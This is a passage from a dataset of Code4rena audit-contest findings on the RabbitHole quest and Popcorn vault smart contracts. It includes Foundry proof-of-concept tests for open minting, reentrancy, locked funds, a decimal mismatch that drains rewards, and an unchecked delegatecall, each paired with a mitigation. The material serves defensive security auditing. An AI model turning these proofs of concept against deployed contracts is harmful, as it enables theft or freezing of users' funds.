protocolFeeRecipient);         receipt.setMinterAddress(address(factory));          // tickets         ticketRenderer = new TicketRenderer();         RabbitHoleTickets ticketsImpl = new RabbitHoleTickets();         tickets = RabbitHoleTickets(             address(new ERC1967Proxy(address(ticketsImpl), \"\"))         );         tickets.initialize(             address(ticketRenderer),             royaltyRecipient,             minter,             0         );          // ERC20 token         token = new ERC20(\"Mock ERC20\", \"MERC20\");         factory.setRewardAllowlistAddress(address(token), true);          vm.stopPrank();     }          function test_RabbitHoleReceipt_RabbitHoleTickets_AnyoneCanMint() public {         address attacker = makeAddr(\"attacker\");          vm.startPrank(attacker);          // Anyone can freely mint RabbitHoleReceipt         string memory questId = \"a quest\";         receipt.mint(attacker, questId);         assertEq(receipt.balanceOf(attacker), 1);          // Anyone can freely mint RabbitHoleTickets         uint256 tokenId = 0;         tickets.mint(attacker, tokenId, 1, \"\");         assertEq(tickets.balanceOf(attacker, tokenId), 1);          vm.stopPrank();     } } ```  ## Recommendation  The modifier should require that the caller is the `minterAddress` in order to revert the call in case this condition doesn't hold.  ```solidity modifier onlyMinter() {     require(msg.sender == minterAddress);     _; } ``` "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/559", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-27"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/catellatech-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/555", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-28"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/peanuts-Q.md)."}, {"title": "When  `rewardToken` is erc1155/erc777,an attacker can reenter and cause funds to be stuck in the contract forever", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/523", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-05"], "target": "2023-01-rabbithole-findings", "body": "# Lines of code  https://github.com/rabbitholegg/quest-protocol/blob/068d628f019e9469aecbf676370075c1f6c980fd/contracts/Quest.sol#L113-L116   # Vulnerability details  ## Impact If the reward token is `erc1155/erc777` an attacker can reenter and then buy/transfer another unclaimed token to the attacker address and then  the var  `redeemTokens` wont be equal to how many tokens were actually redeemed.   ## Proof of Concept ex: reward token is an erc1155 that has  `_afterTokenTransfer`  Alice(attacker) has 2  receipt tokens, the first one is on a  smart contract that will do the reentrancy, and the second  one is on Alice's address but is approved   to transfer to  the  smart contract(the own that holds the first receipt) 1. Alice calls the sc to `claim` rewards ```solidity  IERC1155(rewardToken).safeTransferFrom(address(this), msg.sender, rewardAmountInWeiOrTokenId, amount_, '0x00'); ```  2. `_afterTokenTransfer`  which causes the sc  to  call a function in its fallback function that transfers  the approved token to  the sc ```solidity    try IERC1155Receiver(to).onERC1155Received(operator, from, id, amount, data) returns (bytes4 response) { ``` 3. We then reenter with  recipient,not yet claimed token  and we claim it  result:  the invariant that `redeemedTokens` = tokens that are redeemed is false because it doesn't account for the first token that we reentered.  The issue is worse  with `erc777` tokens because of  the fact  that accounting will be in  the `withdrawRemainingTokens` function ```solidity           uint256 unclaimedTokens = (receiptRedeemers() - redeemedTokens) * rewardAmountInWeiOrTokenId;         uint256 nonClaimableTokens = IERC20(rewardToken).balanceOf(address(this)) - protocolFee() - unclaimedTokens;         IERC20(rewardToken).safeTransfer(to_, nonClaimableTokens);  ``` after the reentrancy  ex: `redeemedTokens=9` but should be 10 `receiptRedeemers()=12`  `rewardAmountInWeiOrTokenId=1e5` `unclaimedTokens=300000 ` assuming they are some tokens left  `balance(address(this)=201000` and `protocolFee=500` `nonClaimableTokens=201000 - 500 - 300000` it would revert ( negative numbers  with uint) and   funds would be stuck in the contract forever The real estimate for `nonClaimableTokens=201000-500-200000=500` and the owner can get funds out  but 500 wei will be lost in the contract  and  it can get worse with large amounts of quests and the attacker  reentering multiple times to cause a bigger gap between the real `redeemedTokens`   ## Tools Used  ## Recommended Mitigation Steps add  nonReentrancy modifier "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/508", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-32"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/BClabs-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/477", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-37"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/nicobevi-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/452", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-39"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/tsvetanovv-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/420", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-44"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/hl_-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/417", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-42"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/zadaru13-Q.md)."}, {"title": "A value of 0 for `rewardAmountInWeiOrTokenId` will cause funds to be locked  in `Erc20Quest` forever.", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/394", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-49"], "target": "2023-01-rabbithole-findings", "body": "# Lines of code  https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L74 https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L81   # Vulnerability details  ## Lines of code  [1. File: Erc20Quest.sol#L74](https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L74)  [2. File: Erc20Quest.sol#L81](https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L81)   ## Vulnerability details  ### The logic for  calculating reward, unclaimed, and fee funds all multiply by `rewardAmountInWeiOrTokenId`, which will always result in a value of zero, leaving no possible way to withdraw funds.  ``` solidity function _calculateRewards(uint256 redeemableTokenCount_) internal view override returns (uint256) {         return redeemableTokenCount_ * rewardAmountInWeiOrTokenId;     } ``` ``` solidity function withdrawRemainingTokens(address to_) public override onlyOwner {         super.withdrawRemainingTokens(to_);          uint unclaimedTokens = (receiptRedeemers() - redeemedTokens) * rewardAmountInWeiOrTokenId;         uint256 nonClaimableTokens = IERC20(rewardToken).balanceOf(address(this)) - protocolFee() - unclaimedTokens;         IERC20(rewardToken).safeTransfer(to_, nonClaimableTokens);     } ```    This issue could arise when the account creating a quest mistakenly passes in zero for `rewardAmountInWeiOrTokenId` and deposits the rewards into the distribution contract before realizing the mistake.  This issue would be further compounded if a smart contract was used to deploy the quest and deposit the funds all in one transaction, leaving no room for recovery.  ## Proof of Concept  A smart contract with the `CREATE_QUEST_ROLE` and the following pseudo code.  ```solidity  newQuest = QuestFactory.createQuest(...,rewardAmountOrTokenId_=0,...);  IERC20(rewardToken).safeTransfer(newQuest, amount);  newQuest.start();  ``` A similar situation could also arise when using a script to deploy and fund the quest.  ## Tools Used Vscode  ## Recommended Mitigation Steps  Require `rewardAmountOrTokenId_` to be greater than 0 on `Erc20Quest` creation.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/341", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-53"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/martin-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/338", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-56"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/glcanvas-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/329", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-59"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/0x4non-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/289", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-62"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/IllIllI-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/248", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-66"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/RaymondFam-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/241", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-58"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/0xSmartContract-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/217", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-68"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/zaskoh-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/185", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-71"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/SaeedAlipoor01988-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/160", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-75"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/Rolezn-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/154", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-77"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/trustindistrust-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/147", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-78"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/carrotsmuggler-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/101", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-81"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/brevis-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/87", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-82"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/prestoncodes-Q.md)."}, {"title": "An owner might start a quest before the publicly declared official  startTime", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/84", "labels": ["bug", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden"], "target": "2023-01-rabbithole-findings", "body": "# Lines of code  https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L50-L53   # Vulnerability details  ## Impact Detailed description of the impact of this finding. An owner might start a quest before the publicly declared official  ``startTime``. This might be done by mistake or on purpose, creating undesirable user experience since a user would expect a quest won't start before its declared public ``startTime``.  This contradicts the [documentation](https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L56-L57), which says \"Marking a quest ready to start does not mean that it is live. It also requires that the start time has passed\".  ## Proof of Concept Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept. The ``start()`` below allows an owner to start a quest before the publicly declared official  ``startTime``: ```javascript  function start() public virtual onlyOwner {         isPaused = false;         hasStarted = true;     }  function start() public override {         if (IERC1155(rewardToken).balanceOf(address(this), rewardAmountInWeiOrTokenId) < totalParticipants)             revert TotalAmountExceedsBalance();         super.start();     }   function start() public override {         if (IERC20(rewardToken).balanceOf(address(this)) < maxTotalRewards() + maxProtocolReward())             revert TotalAmountExceedsBalance();         super.start();     }  ```     ## Tools Used Remix  ## Recommended Mitigation Steps There are two ways to fix, 1) automatic start; 2) manual start.  For the automatic start, we just need to introduce a modifier called hasStarted() to replace the state variable ``hasStarted``: ```javascript modifier hasStarted() {           if(block.timestamp < startTime) revert hasNotStarted();           _; } ```  To performed a manual start: ```javasript  function start() public virtual onlyOwner {         if(block.timestamp < startTime) revert tooEarlyToStart();          isPaused = false;         hasStarted = true; } ```   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/71", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-83"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/btk-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/54", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-85"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/chrisdior4-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/43", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-86"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/arialblack14-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/38", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-88"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/HollaDieWaldfee-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/32", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-89"], "target": "2023-01-rabbithole-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-rabbithole-findings/blob/main/data/seeu-Q.md)."}, {"title": "Vault creator can prevent users from claiming staking rewards", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/829", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "selected for report", "sponsor confirmed", "edited-by-warden", "M-01"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardEscrow.sol#L111   # Vulnerability details  ## Impact  Vault creator can prevent users from claiming rewards from the staking contract. This can boost his liquidity and lure depositors to stake vault tokens. He can present a high APY and low fee percentage which will incentivize stakers  When the staking contract is empty of stakes, he can change the settings and claim all the rewards to himself.   ## Proof of Concept  Vault creator receives management fees from two places: 1. Deposits to the vault 2. Rewards locked in escrow  Users can claim staking rewards by calling the `claimRewards` function of the staking contract: https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L179 ```   function claimRewards(address user, IERC20[] memory _rewardTokens) external accrueRewards(msg.sender, user) {     for (uint8 i; i < _rewardTokens.length; i++) {       uint256 rewardAmount = accruedRewards[user][_rewardTokens[i]];        if (rewardAmount == 0) revert ZeroRewards(_rewardTokens[i]);        EscrowInfo memory escrowInfo = escrowInfos[_rewardTokens[i]];        if (escrowInfo.escrowPercentage > 0) {         _lockToken(user, _rewardTokens[i], rewardAmount, escrowInfo);         emit RewardsClaimed(user, _rewardTokens[i], rewardAmount, true);       } else {         _rewardTokens[i].transfer(user, rewardAmount);         emit RewardsClaimed(user, _rewardTokens[i], rewardAmount, false);       }        accruedRewards[user][_rewardTokens[i]] = 0;     }   } ```  As can be seen above, if there is an escrow specified, percentage of rewards are sent to the escrow account through `_lockToken`: https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L201 ```   /// @notice Locks a percentage of a reward in an escrow contract. Pays out the rest to the user.   function _lockToken(     address user,     IERC20 rewardToken,     uint256 rewardAmount,     EscrowInfo memory escrowInfo   ) internal {     uint256 escrowed = rewardAmount.mulDiv(uint256(escrowInfo.escrowPercentage), 1e18, Math.Rounding.Down);     uint256 payout = rewardAmount - escrowed;      rewardToken.safeTransfer(user, payout);     escrow.lock(rewardToken, user, escrowed, escrowInfo.escrowDuration, escrowInfo.offset);   } ```  `escorw.lock` will send fee to `feeRecipient` that is passed in the constructor of the escrow contract when there is a fee percentage defined. (This can be low in order to incentivize stakers) https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardEscrow.sol#L111 ```   constructor(address _owner, address _feeRecipient) Owned(_owner) {     feeRecipient = _feeRecipient;   }  ------    function lock(     IERC20 token,     address account,     uint256 amount,     uint32 duration,     uint32 offset   ) external { -----     uint256 feePerc = fees[token].feePerc;     if (feePerc > 0) {       uint256 fee = Math.mulDiv(amount, feePerc, 1e18);        amount -= fee;       token.safeTransfer(feeRecipient, fee);     } ----- ```  The issue rises when `feeRecipient` is set to the zero address (0x0). `safeTransfer` will revert and the transaction of claiming rewards will fail (all the way through the `claimRewards` on the staking contract`.  User funds will be locked in the contract.   The vault creator can decide when is the right time to open the rewards up (maybe when nobody is invested in the vault) by changing the fee percentage to 0 using `setFees`, which bypass sending fees to feeReceipient. if the vault owner will be the only saker, he can receive all the deposited tokens back  ### Foundry POC  Add the following test: ``` // SPDX-License-Identifier: GPL-3.0 // Docgen-SOLC: 0.8.15  pragma solidity ^0.8.15;  import { Test } from \"forge-std/Test.sol\"; import { MockERC20 } from \"./utils/mocks/MockERC20.sol\"; import { IMultiRewardEscrow } from \"../src/interfaces/IMultiRewardEscrow.sol\"; import { MultiRewardStaking, IERC20 } from \"../src/utils/MultiRewardStaking.sol\"; import { MultiRewardEscrow } from \"../src/utils/MultiRewardEscrow.sol\";  contract NoRewards is Test {   MockERC20 stakingToken;   MockERC20 rewardToken1;   MockERC20 rewardToken2;   IERC20 iRewardToken1;   IERC20 iRewardToken2;   MultiRewardStaking staking;   MultiRewardEscrow escrow;    address alice = address(0xABCD);   address bob = address(0xDCBA);    ///////////// ZERO ADDRESS //////////   address feeRecipient = address(0x0);       function setUp() public {     vm.label(alice, \"alice\");     vm.label(bob, \"bob\");      stakingToken = new MockERC20(\"Staking Token\", \"STKN\", 18);      rewardToken1 = new MockERC20(\"RewardsToken1\", \"RTKN1\", 18);     rewardToken2 = new MockERC20(\"RewardsToken2\", \"RTKN2\", 18);     iRewardToken1 = IERC20(address(rewardToken1));     iRewardToken2 = IERC20(address(rewardToken2));      escrow = new MultiRewardEscrow(address(this), feeRecipient);     IERC20[] memory tokens = new IERC20[](2);     tokens[0] = iRewardToken1;     tokens[1] = iRewardToken2;     uint256[] memory fees = new uint256[](2);     fees[0] = 1e16;     fees[1] = 1e16;      escrow.setFees(tokens, fees);     staking = new MultiRewardStaking();     staking.initialize(IERC20(address(stakingToken)), IMultiRewardEscrow(address(escrow)), address(this));   }    function _addRewardToken(MockERC20 rewardsToken) internal {     rewardsToken.mint(address(this), 10 ether);     rewardsToken.approve(address(staking), 10 ether);     staking.addRewardToken(IERC20(address(rewardsToken)), 0.1 ether, 10 ether, true, 30, 100, 0);   }    function test__no_rewards() public {     // Prepare array for `claimRewards`     IERC20[] memory rewardsTokenKeys = new IERC20[](1);     rewardsTokenKeys[0] = iRewardToken1;      _addRewardToken(rewardToken1);     stakingToken.mint(alice, 5 ether);      vm.startPrank(alice);     stakingToken.approve(address(staking), 5 ether);     staking.deposit(1 ether);      // 10% of rewards paid out     vm.warp(block.timestamp + 10);      uint256 callTimestamp = block.timestamp;     staking.claimRewards(alice, rewardsTokenKeys);   } }  ```  test `test__no_rewards` ## Tools Used  VS Code, Foundry  ## Recommended Mitigation Steps  Validate in the initialization of the staking contracts that escrow.feeRecipient is not the zero address"}, {"title": "Any user can drain the entire reward fund in MultiRewardStaking due to incorrect calculation of `supplierDelta`", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/791", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L406 https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L427 https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L274   # Vulnerability details  ## Impact  Reward `deltaIndex` in `_accrueRewards()` is multiplied by `10**decimals()` but eventually divided by `rewards.ONE` (which is equal to `10**IERC20Metadata(address(rewardToken)).decimals()`) in `_accrueUser()`.   If the number of decimals in MultiRewardEscrow share token differs from the number of decimals in the reward token, then all rewards are multipled by `10 ** (decimals() - rewardToken.decimals())`.  Therefore, for example, if an admin adds USDT as the reward token with decimals=6, it will result in the reward for any user to be multiplied by ``10**(18-6) = 1000000000000` on the next block. This will at best lead to a DOS where no one will be able to withdraw funds. But at worst, users will drain the entire reward fund due to inflated calculations in the next block.   ## Proof of Concept   Put the following test in `./test/` folder and run with `forge test --mc DecimalMismatchTest`. The test fails because of incorrect `supplierDelta` calculations: ```solidity // SPDX-License-Identifier: GPL-3.0 // Docgen-SOLC: 0.8.15  pragma solidity ^0.8.15;  import { Test } from \"forge-std/Test.sol\"; import { SafeCastLib } from \"solmate/utils/SafeCastLib.sol\"; import { MockERC20 } from \"./utils/mocks/MockERC20.sol\"; import { IMultiRewardEscrow } from \"../src/interfaces/IMultiRewardEscrow.sol\"; import { MultiRewardStaking, IERC20 } from \"../src/utils/MultiRewardStaking.sol\"; import { MultiRewardEscrow } from \"../src/utils/MultiRewardEscrow.sol\";  contract DecimalMismatchTest is Test {   using SafeCastLib for uint256;    MockERC20 stakingToken;   MockERC20 rewardToken;   MultiRewardStaking staking;   MultiRewardEscrow escrow;    address alice = address(0xABCD);   address bob = address(0xDCBA);   address feeRecipient = address(0x9999);    function setUp() public {     vm.label(alice, \"alice\");     vm.label(bob, \"bob\");      // staking token has 18 decimals     stakingToken = new MockERC20(\"Staking Token\", \"STKN\", 18);      // reward token has 6 decimals (for example USDT)     rewardToken = new MockERC20(\"RewardsToken1\", \"RTKN1\", 6);      escrow = new MultiRewardEscrow(address(this), feeRecipient);      staking = new MultiRewardStaking();     staking.initialize(IERC20(address(stakingToken)), IMultiRewardEscrow(address(escrow)), address(this));          rewardToken.mint(address(this), 1000 ether);     rewardToken.approve(address(staking), 1000 ether);      staking.addRewardToken(       // rewardToken       IERC20(address(rewardToken)),             // rewardsPerSecond       1e10,         // amount       1e18,         // useEscrow       false,         // escrowPercentage       0,         // escrowDuration       0,         // offset       0     );    }    function testWrongSupplierDelta() public {     stakingToken.mint(address(bob), 1);          vm.prank(bob);     stakingToken.approve(address(staking), 1);          vm.prank(bob);     staking.deposit(1);      assert (staking.balanceOf(bob) == 1);      vm.warp(block.timestamp + 1);      IERC20[] memory a = new IERC20[](1);     a[0] = IERC20(address(rewardToken));      vm.prank(bob);      // 1 second elapsed, so Bob must get a little reward     // but instead this will REVERT with \"ERC20: transfer amount exceeds balance\"     // because the `supplierDelta` is computed incorrect and becomes too large     staking.claimRewards(bob, a);   } } ```   ## Tools Used  Manual analysis   ## Recommended Mitigation Steps  Use the same number of decimals when calculating `deltaIndex` and `supplierDelta`. "}, {"title": "Delegatecall can silently fail when Adapter calls harvest() Strategy.", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/787", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-14"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L433-L450   # Vulnerability details  ## Impact There is no check on the result of the delegate call to strategy, executing `strategy.harvest()`: `address(strategy).delegatecall(abi.encodeWithSignature(\"harvest()\"));`   It means that if `strategy.harvest()` reverts for any reason, `adapter.harvest()` will silently fail.  The `harvest` function is used in: - `_deposit(address caller, address receiver, uint256 assets, uint256 shares)`   [\\_deposit function in AdapterBase.sol GitHub Link](https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L143-L165) - `_withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares)`   [\\_withdraw function in AdapterBase.sol GitHub Link](https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L206-L235)  These two **internal** functions are used by these four **external** functions: - `deposit(uint256 assets, address receiver)`:   [deposit function in AdapterBase.sol GitHub Link](https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L105-L122) - `mint(uint256 shares, address receiver)`:   [mint function in AdapterBase.sol GitHub Link](https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L124-L141) - `withdraw(uint256 assets, address receiver, address owner)`:   [withdraw function in AdapterBase.sol GitHub Link](https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L167-L185) - `redeem(uint256 shares, address receiver, address owner)`:   [redeem function in AdapterBase.sol GitHub Link](https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L187-L204)  Moreover, `function harvest() public takeFees` is **public**, with no access-control, which  means that **anyone can call it any time**.  Depending on what the attached strategy is supposed to do, the functions executing `adapter.harvest()` could have unexpected results, can't say much as it depends on a strategy that hasn't been implemented yet.  ## Proof of Concept I used the BeefyAdapter for this PoC, but it would work the same way with any adapter that inherits AdapterBase.  ![testFail_harvest_revert source code](https://i.imgur.com/mjXpRGy.png)  - The strategy used is the MockStrategyRevert.sol, its `harvest` function reverts with \"StrategyReverted()\" when called. ![MockStrategyRevert.sol source code](https://i.imgur.com/hkfu8Qm.png) - The PoC rely on on calling `harvest()` in such conditions that `strategy.harvest()` will be called. We expect that the transaction reverts but it actually won't as the logs show:  ![testFail_harvest_revert logs](https://i.imgur.com/IPe6dp2.png)  ## Tools Used Manual Review  ## Recommended Mitigation Steps Check the result of the delegated call to `strategy` and revert in case of failure. ``` /** * @notice Execute Strategy and take fees. Updates lastHarvest * @dev Delegatecall to strategy's harvest() function. All necessary data is passed via `strategyConfig`. * @dev Delegatecall is used in case any logic requires the adapters address as a msg.sender. (e.g. Synthetix staking) */  error StrategyFailed();  function harvest() public takeFees {  if (   address(strategy) != address(0) &&   ((lastHarvest + harvestCooldown) < block.timestamp)  ) {   //lastHarvest update should also be done      // solhint-disable   //Delegated call no return value should be addressed   (bool success, ) 